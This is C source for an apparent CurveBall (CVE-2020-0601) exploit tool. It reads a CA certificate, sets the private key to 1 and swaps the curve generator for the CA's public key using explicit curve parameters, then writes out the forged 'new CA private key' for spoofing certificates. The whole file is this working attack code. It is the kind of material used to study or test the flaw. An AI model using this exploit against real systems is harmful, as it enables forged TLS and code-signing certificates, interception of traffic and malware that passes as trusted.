#include "curveball.h"

int main(int argc, char **argv)
{
    struct arguments arguments = { 0 };
    argp_parse(&argp, argc, argv, 0, 0, &arguments);

    FILE *f = fopen(arguments.originalCertFileName, "r");
    if (f == NULL)
    {
        perror("Error reading certificate");
        exit(EXIT_FAILURE);
    }

    BIO *bio = BIO_new_fd(fileno(stdout), BIO_NOCLOSE);
    
    X509 *cert = PEM_read_X509(f, NULL, NULL, NULL);
    EVP_PKEY *publicKey = X509_get0_pubkey(cert);
    EC_KEY *ecKey = EVP_PKEY_get0_EC_KEY(publicKey);

    // Spoofing the certificate

    // Set private key to 1
    BIGNUM *privateKey = BN_new();
    BN_hex2bn(&privateKey, "1");
    EC_KEY_set_private_key(ecKey, privateKey);
    
    // Set EC group generator and Explicit flag
    const EC_GROUP *group = EC_KEY_get0_group(ecKey);
    EC_GROUP *spoofedGroup = EC_GROUP_dup(group);
    EC_GROUP_set_generator(spoofedGroup, EC_KEY_get0_public_key(ecKey), EC_GROUP_get0_order(group), EC_GROUP_get0_cofactor(group));
    EC_GROUP_set_asn1_flag(spoofedGroup, OPENSSL_EC_EXPLICIT_CURVE);

    EC_KEY_set_group(ecKey, spoofedGroup);

    // This is the new CA private key    
    PEM_write_bio_ECPrivateKey(bio, ecKey, NULL, NULL, 0, NULL, NULL);
    
    BIO_flush(bio);
    BIO_free(bio);
    
    return 0;
}

static error_t parse_option(int key, char *arg, struct argp_state *state)
{
    struct arguments *arguments = state->input;

    switch(key)
    {
        case 's':
            arguments->sign = true;
            break;
        case 't':
            arguments->tls = true;
            break;
        case ARGP_KEY_ARG:
            if (state->arg_num == 0)
                arguments->originalCertFileName = arg;
            else
                argp_usage(state);
            break;
        case ARGP_KEY_END:
            if (arguments->originalCertFileName == NULL)
                argp_usage(state);
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }
    return 0;
}